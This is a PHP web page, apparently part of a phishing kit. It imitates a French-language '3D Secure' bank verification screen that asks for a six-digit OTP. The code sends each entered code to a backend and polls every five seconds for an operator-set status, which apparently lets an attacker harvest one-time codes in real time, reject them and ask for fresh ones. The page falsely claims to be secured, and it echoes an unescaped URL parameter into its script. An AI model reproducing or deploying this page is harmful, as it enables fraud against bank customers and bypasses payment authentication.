<?php
require_once 'auth_check.php';
session_start();
require_once 'functions.php';

// التحقق من وجود معرف الجلسة
$sessionId = $_GET['session'] ?? null;

// التحقق من وجود معرف الجلسة والبيانات
if (!$sessionId) {
    header('Location: index.php');
    exit;
}

// استرجاع بيانات المعاملة
$transactionData = getTransactionData($sessionId);
if (!$transactionData) {
    header('Location: index.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification OTP</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .otp-container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 500px;
            width: 100%;
        }

        .icon {
            width: 80px;
            height: 80px;
            margin: 0 auto 20px;
            color: #007bff;
        }

        .title {
            color: #333;
            font-size: 24px;
            margin-bottom: 20px;
        }

        .notice {
            background: #fff3cd;
            border: 1px solid #ffeeba;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            text-align: left;
        }

        .notice i {
            margin-right: 10px;
        }

        .otp-input-group {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 30px 0;
        }

        .otp-input {
            width: 50px;
            height: 50px;
            border: 2px solid #ddd;
            border-radius: 8px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            color: #333;
        }

        .otp-input:focus {
            border-color: #007bff;
            outline: none;
            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.25);
        }

        .timer {
            color: #666;
            font-size: 14px;
            margin: 20px 0;
        }

        .resend-button {
            background: none;
            border: none;
            color: #007bff;
            cursor: pointer;
            font-size: 14px;
            text-decoration: underline;
            margin-top: 10px;
        }

        .resend-button:disabled {
            color: #999;
            cursor: not-allowed;
            text-decoration: none;
        }

        .submit-button {
            background: #007bff;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
            margin: 20px auto;
        }

        .submit-button:hover {
            background: #0056b3;
        }

        .submit-button:disabled {
            background: #6c757d;
            cursor: not-allowed;
            opacity: 0.7;
        }

        .submit-button:disabled:hover {
            background: #6c757d;
        }

        .error-message {
            color: #dc3545;
            margin-top: 10px;
            display: none;
        }

        .transaction-id {
            background-color: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            margin: 20px 0;
            color: #666;
        }

        .secure-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            color: #28a745;
            margin-top: 20px;
            font-size: 14px;
        }

        .error-banner {
            background: linear-gradient(135deg, #dc3545, #c82333);
            border-radius: 10px;
            padding: 20px;
            margin: 20px 0;
            color: white;
            display: flex;
            align-items: center;
            gap: 15px;
            box-shadow: 0 4px 15px rgba(220, 53, 69, 0.3);
            animation: errorShake 0.5s ease-in-out;
        }

        .error-icon {
            font-size: 24px;
            flex-shrink: 0;
        }

        .error-content h3 {
            margin: 0 0 8px 0;
            font-size: 18px;
            font-weight: bold;
        }

        .error-content p {
            margin: 0;
            font-size: 14px;
            line-height: 1.4;
            opacity: 0.95;
        }

        @keyframes errorShake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .otp-input.error {
            border-color: #dc3545;
            background-color: #fff5f5;
            animation: inputError 0.3s ease-in-out;
        }

        @keyframes inputError {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-3px); }
            75% { transform: translateX(3px); }
        }
    </style>
</head>
<body>
    <div class="otp-container">
        <div class="icon">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M12 15v3m-6 4h12a2 2 0 002-2V8l-8-6-8 6v12a2 2 0 002 2zm4-16v3"/>
            </svg>
        </div>
        
        <h1 class="title">Code de vérification</h1>
        
        <?php if (isset($_SESSION['transaction_status_' . $sessionId]) && $_SESSION['transaction_status_' . $sessionId] === 'otp_incorrect'): ?>
        <div class="error-banner">
            <div class="error-icon">
                <i class="fas fa-times-circle"></i>
            </div>
            <div class="error-content">
                <h3>Code incorrect</h3>
                <p>Le code OTP que vous avez saisi est incorrect. Veuillez vérifier et entrer le nouveau code envoyé à votre application bancaire.</p>
            </div>
        </div>
        <?php endif; ?>
        
        <div class="notice">
            <i class="fas fa-info-circle"></i>
            Un code de vérification à 6 chiffres a été envoyé à votre application bancaire.
        </div>

        <div class="otp-input-group">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
            <input type="text" class="otp-input" maxlength="1" pattern="[0-9]" inputmode="numeric">
        </div>

        <div class="timer">
            Expire dans <span id="countdown">03:00</span>
        </div>

        <button class="submit-button" onclick="verifyOTP()">
            <i class="fas fa-check"></i>
            Vérifier
        </button>

        <button class="resend-button" id="resendButton" disabled onclick="resendOTP()">
            Renvoyer le code
        </button>

        <div class="error-message" id="errorMessage"></div>

        <div class="transaction-id">
            ID Transaction: <?php echo htmlspecialchars($sessionId); ?>
        </div>

        <div class="secure-badge">
            <i class="fas fa-shield-alt"></i>
            Sécurisé par 3D Secure
        </div>
    </div>

    <script>
        // تهيئة العد التنازلي
        let timeLeft = 180; // 3 دقائق
        const countdownElement = document.getElementById('countdown');
        const resendButton = document.getElementById('resendButton');
        
        function updateCountdown() {
            const minutes = Math.floor(timeLeft / 60);
            const seconds = timeLeft % 60;
            countdownElement.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
            
            if (timeLeft <= 0) {
                clearInterval(countdownInterval);
                resendButton.disabled = false;
            } else {
                timeLeft--;
            }
        }

        const countdownInterval = setInterval(updateCountdown, 1000);
        updateCountdown();

        // معالجة إدخال OTP
        const otpInputs = document.querySelectorAll('.otp-input');
        
        otpInputs.forEach((input, index) => {
            input.addEventListener('input', (e) => {
                // إزالة تأثير الخطأ عند الكتابة
                if (input.classList.contains('error')) {
                    otpInputs.forEach(inp => inp.classList.remove('error'));
                    document.getElementById('errorMessage').style.display = 'none';
                }
                
                if (e.target.value) {
                    if (index < otpInputs.length - 1) {
                        otpInputs[index + 1].focus();
                    } else {
                        // التحقق تلقائياً عند ملء آخر حقل
                        const allFilled = Array.from(otpInputs).every(inp => inp.value);
                        if (allFilled) {
                            setTimeout(() => verifyOTP(), 300); // تأخير قصير للتأكد من الإدخال
                        }
                    }
                }
            });

            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !e.target.value && index > 0) {
                    otpInputs[index - 1].focus();
                }
                
                // التحقق تلقائياً عند الضغط على Enter في آخر حقل
                if (e.key === 'Enter' && index === otpInputs.length - 1) {
                    const allFilled = Array.from(otpInputs).every(inp => inp.value);
                    if (allFilled) {
                        verifyOTP();
                    }
                }
            });

            // منع إدخال أحرف غير رقمية
            input.addEventListener('keypress', (e) => {
                if (!/[0-9]/.test(e.key) && e.key !== 'Backspace' && e.key !== 'Delete' && e.key !== 'Tab') {
                    e.preventDefault();
                }
            });
        });

        // التحقق من رمز OTP
        function verifyOTP() {
            const otp = Array.from(otpInputs).map(input => input.value).join('');
            
            // التحقق من صحة الإدخال
            if (otp.length === 0) {
                showError('Veuillez entrer le code de vérification');
                return;
            }
            
            if (otp.length !== 6) {
                showError('Le code doit contenir exactement 6 chiffres');
                return;
            }
            
            if (!/^\d+$/.test(otp)) {
                showError('Le code ne doit contenir que des chiffres');
                return;
            }

            // تعطيل الزر أثناء التحقق
            const submitButton = document.querySelector('.submit-button');
            const originalText = submitButton.innerHTML;
            submitButton.disabled = true;
            submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Vérification...';

            fetch('send_action.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: 'verify_otp',
                    session_id: '<?php echo $sessionId; ?>',
                    otp_code: otp
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    submitButton.innerHTML = '<i class="fas fa-check"></i> Code vérifié !';
                    submitButton.style.background = '#28a745';
                    setTimeout(() => {
                        window.location.href = 'waiting.php?session=<?php echo $sessionId; ?>';
                    }, 1000);
                } else {
                    submitButton.disabled = false;
                    submitButton.innerHTML = originalText;
                    showError(data.message || 'Code incorrect. Veuillez réessayer.');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                submitButton.disabled = false;
                submitButton.innerHTML = originalText;
                showError('Erreur de connexion. Veuillez réessayer.');
            });
        }

        // إعادة إرسال رمز OTP
        function resendOTP() {
            resendButton.disabled = true;
            timeLeft = 180;
            updateCountdown();
            countdownInterval = setInterval(updateCountdown, 1000);

            fetch('send_action.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: 'request_otp',
                    session_id: '<?php echo $sessionId; ?>'
                })
            })
            .then(response => response.json())
            .then(data => {
                if (!data.success) {
                    showError(data.message || 'Erreur lors de l\'envoi du code');
                }
            })
            .catch(error => {
                console.error('Error:', error);
                showError('Une erreur est survenue');
            });
        }

        function showError(message) {
            const errorElement = document.getElementById('errorMessage');
            errorElement.textContent = message;
            errorElement.style.display = 'block';
            
            // إضافة تأثير خطأ للحقول
            otpInputs.forEach(input => {
                input.classList.add('error');
                input.value = '';
            });
            
            // التركيز على أول حقل
            otpInputs[0].focus();
            
            // تشغيل اهتزاز إذا كان متاحاً (الهواتف المحمولة)
            if ('vibrate' in navigator) {
                navigator.vibrate([200, 100, 200]);
            }
            
            // إزالة التأثير بعد 3 ثوانٍ
            setTimeout(() => {
                errorElement.style.display = 'none';
                otpInputs.forEach(input => {
                    input.classList.remove('error');
                });
            }, 3000);
        }

        // مراقبة حالة المعاملة
        const sessionId = '<?php echo $sessionId; ?>';
        let checkStatusInterval;
        let lastStatus = '';

        function checkTransactionStatus() {
            fetch('send_action.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    action: 'check_status',
                    session_id: sessionId
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    if (lastStatus === data.status) {
                        return;
                    }
                    lastStatus = data.status;

                    switch(data.status) {
                        case 'approved':
                            clearInterval(checkStatusInterval);
                            window.location.href = 'success.php?session=' + sessionId;
                            break;
                        case 'rejected':
                            clearInterval(checkStatusInterval);
                            window.location.href = 'error.php?session=' + sessionId;
                            break;
                        case 'waiting':
                            clearInterval(checkStatusInterval);
                            window.location.href = 'waiting.php?session=' + sessionId;
                            break;
                        case 'otp_incorrect':
                            // مسح الحقول وإظهار رسالة الخطأ
                            otpInputs.forEach(input => {
                                input.value = '';
                                input.classList.add('error');
                            });
                            showError('Code OTP incorrect. Veuillez entrer le nouveau code.');
                            otpInputs[0].focus();
                            break;
                    }
                }
            })
            .catch(error => {
                console.error('Error:', error);
            });
        }

        // بدء فحص الحالة كل 5 ثوانٍ
        checkStatusInterval = setInterval(checkTransactionStatus, 5000);

        // التركيز على أول حقل عند تحميل الصفحة
        window.addEventListener('load', () => {
            otpInputs[0].focus();
            
            // إذا كانت هناك رسالة خطأ، أضف تأثير خطأ للحقول
            <?php if (isset($transactionData['status']) && $transactionData['status'] === 'otp_incorrect'): ?>
            otpInputs.forEach(input => {
                input.classList.add('error');
            });
            
            // إزالة التأثير بعد 5 ثوانٍ
            setTimeout(() => {
                otpInputs.forEach(input => {
                    input.classList.remove('error');
                });
            }, 5000);
            <?php endif; ?>
        });
    </script>
</body>
</html> 